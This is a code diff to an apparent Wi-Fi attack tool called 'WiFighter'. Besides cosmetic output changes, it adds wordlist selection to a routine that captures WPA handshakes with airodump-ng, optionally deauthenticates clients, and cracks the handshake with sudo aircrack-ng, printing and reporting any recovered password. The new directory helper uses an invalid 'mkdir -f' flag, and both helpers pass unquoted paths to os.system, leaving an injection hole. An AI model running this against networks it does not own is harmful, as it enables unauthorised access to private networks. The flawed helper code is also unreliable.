@@ -79,19 +79,21 @@ def logo():
 
 def create_cap_dir(target, output_dir):
      if target:
-          if os.path.exists(output_dir):
-               pass
-          else:
-               print(f"Creating capture directory -> WiFighter/attacks/{target.replace(' ', '_')}")
+          if not os.path.exists(output_dir):
+               print(f"{CYAN}[>]{RESET} Creating capture directory -> WiFighter/attacks/{target.replace(' ', '_')}")
                os.system(f'mkdir {output_dir}')
-               print()
+
+def create_dir(path):
+     if not os.path.exists(path):
+          os.system(f'mkdir -f {path}')
+        
 
 def generate_report(attack, target_ap, crack, target, output_dir):
      current_time = datetime.now()
      timestamp = current_time.strftime("%Y-%m-%d %H:%M:%S")
      filename = attack.lower().replace(" ", "_") + f'_{str(timestamp).replace(" ", "_")}'
 
-     print(f"{CYAN}[>]{RESET} Generating report -> WiFighter/attacks/{target.replace(' ', '_')}/{filename}.report \n")
+     print(f"{YELLOW}[>]{RESET} Generating report -> WiFighter/attacks/{target.replace(' ', '_')}/{filename}.report")
 
      template = f"""
 | {target} - {timestamp} |
@@ -197,8 +199,7 @@ def monitor_switch(verbose, command, interface):
 
 def list_interfaces():
      interfaces_path = '/sys/class/net/'
-     print(f"{CYAN}Detected Wi-Fi Interfaces:{RESET}")
-     print()
+     print(f"{CYAN}Detected Wi-Fi Interfaces:{RESET}\n")
     # Iterate over all the interfaces in the directory
      for interface in os.listdir(interfaces_path):
           # Make sure that the interface is a wireless interface
@@ -221,8 +222,7 @@ def choose_interface():
 
      idx = 1
      # Show detected interfaces
-     print(f"{CYAN}| Select Interface |{RESET}")
-     print()
+     print(f"{CYAN}| Select Interface |{RESET}\n")
 
      for interface in detected_interfaces:
           print(f"{idx}. {interface}")
@@ -269,8 +269,7 @@ def choose_target():
 def choose_attack(target_ap):
      global attack_list
 
-     print(f'{CYAN}| Select Attack |{RESET}')
-     print()
+     print(f'{CYAN}| Select Attack |{RESET}\n')
      target_ap = f"{target_ap['SSID']} ({target_ap['BSSID']})" if target_ap['SSID'] else target_ap['BSSID']
      print(f'Select attack on {target_ap}')
 
@@ -300,8 +299,7 @@ def choose_attack(target_ap):
 def choose_deauth_mode():
      global deauth_modes
      
-     print(f'{CYAN}| Select Deauth Mode |{RESET}')
-     print()
+     print(f'{CYAN}| Select Deauth Mode |{RESET}\n')
 
      idx = 1
      # Show attack modes
@@ -326,7 +324,48 @@ def choose_deauth_mode():
      except KeyboardInterrupt:
           print(f"\n\n{BLUE}Exiting the tool...{RESET}")
 
-     
+def choose_wordlist():
+     global wifighter_path
+     wordlists_path = f'{wifighter_path}/wordlists/'
+     detected_wordlists = []
+
+     # Create wordlists directory doesn't exist
+     create_dir(wordlists_path)
+
+     # Iterate over all the interfaces in the directory
+     for wordlist in os.listdir(wordlists_path):
+          detected_wordlists.append(wordlist)
+
+     if detected_wordlists:
+          idx = 1
+          # Show detected interfaces
+          print(f"\n{CYAN}Select wordlist for cracking:{RESET}\n")
+
+          for wordlist in detected_wordlists:
+               print(f"{idx}. {wordlist}")
+               idx += 1
+
+          try:
+               while True:     
+                    try:
+                         # Prompt the user to choose an interface by number
+                         choice = int(input(f"\nWordlist number: ")) - 1
+                    except ValueError:
+                         print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
+                         continue
+                    
+                    # Check if the choice is in range
+                    if 0 <= choice < len(detected_wordlists):
+                         # Return chosen interface
+                         wordlist = detected_wordlists[choice]
+                         return wordlist
+                    else:
+                         print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
+          except KeyboardInterrupt:
+               pass     
+     else:
+          print(f"\n{YELLOW}No wordlists found! Skipping password cracking... Add wordlists -> WiFighter/wordlists/{RESET}")
+
 
  #------------------------------------------------------------------------------------
 
@@ -535,6 +574,8 @@ def handshake_crack(target_ap, interface, deauth_mode):
      channel = target_ap['Channel'] if target_ap['Channel'] else None
      deauth_mode = deauth_mode.lower()
      target_client = None
+     wordlist = None
+     password = None
 
      # Set deauth client if needed
      if deauth_mode == 'client deauth' and not target_client:
@@ -614,14 +655,21 @@ def handshake_crack(target_ap, interface, deauth_mode):
      
 
      logo()
-     print(f'{CYAN}| Handshake Crack |{RESET}')
-     print()
+     print(f'{CYAN}| Handshake Crack |{RESET}\n')
      if ssid:
           print(f'Attacking on {ssid} ({bssid}) with {interface}...')
      else:
           print(f'Attacking on {bssid} with {interface}...')
 
      create_cap_dir(target, output_dir) # Create capture dir if not exist
+
+     # Handle cases where handshake cracking not possible
+     if target_ap['Encryption'] == 'Open/Unknown':
+          print(f"\n{YELLOW}!! This is either Open network or the encryption type wasn't recognized correctly !! Skipping...{RESET}")
+          return
+     elif target_ap['Encryption'] == 'WPA3' or target_ap['Auth'] == 'IEEE 802.1X':
+          print(f"\n{YELLOW}!! WPA3 protected or Enterprise authenticated networks aren't vulnerable to this type of attack !! Skipping...{RESET}")
+          return
 
      # Define processes
      capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_dir))
@@ -643,7 +691,7 @@ def handshake_crack(target_ap, interface, deauth_mode):
 
      # Wait and verify that handshake was captured successfuly
      captured = False
-     print(f"{CYAN}[>]{RESET} Waiting for handshake... -> Capture file will be saved -> WiFighter/attacks/{target.replace(' ', '_')}/{output_file}")
+     print(f"{CYAN}[>]{RESET} Waiting for handshake...")
      if deauth_mode != 'silent':
           start_time = time.time() # Start deauth timer
      while not captured:
@@ -672,25 +720,35 @@ def handshake_crack(target_ap, interface, deauth_mode):
           time.sleep(1)
 
      kill_airodump_processes() # Kill all airodump-ng processes
-     
-     # Try cracking the password
+
      try:
-          print(f"{CYAN}[>]{RESET} Cracking handshake with wordlist.txt")
-          command = ['sudo', 'aircrack-ng', '-w', 'wordlist.txt', f'{output_dir}/{output_file}']
-          crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-          output = str(crack.communicate())
-
-          if 'KEY FOUND!' in output:
-               password_pattern = r'KEY FOUND!\s* \[\s*(.+?)\s*\]'
-               password_match = re.search(password_pattern, output) # Search for the pattern in the output string
-
-               # Extract and print the key if found
-               if password_match:
-                    password = password_match.group(1)
-                    print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
-                    generate_report('Handshake Crack', target_ap, password, target, output_dir)
+          wordlist = choose_wordlist()
      except KeyboardInterrupt:
           pass
+     
+     # Try cracking the password
+     if wordlist:
+          try:
+               print(f"{CYAN}[>]{RESET} Cracking handshake with {wordlist}")
+               command = ['sudo', 'aircrack-ng', '-w', f'wordlists/{wordlist}', f'{output_dir}/{output_file}']
+               crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+               output = str(crack.communicate())
+
+               if 'KEY FOUND!' in output:
+                    password_pattern = r'KEY FOUND!\s* \[\s*(.+?)\s*\]'
+                    password_match = re.search(password_pattern, output) # Search for the pattern in the output string
+
+                    # Extract and print the key if found
+                    if password_match:
+                         password = password_match.group(1)
+                         print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
+                         generate_report('Handshake Crack', target_ap, password, target, output_dir)
+          except KeyboardInterrupt:
+               pass
+     
+     if not password or not wordlist:
+          print(f"\n{CYAN}[>]{RESET} Password not found...")
+          print(f"{YELLOW}[>]{RESET} Handshake available for offline cracking -> WiFighter/attacks/{target.replace(' ', '_')}/{output_file}")
 
 
 #------------------------------------------------------------------------------------
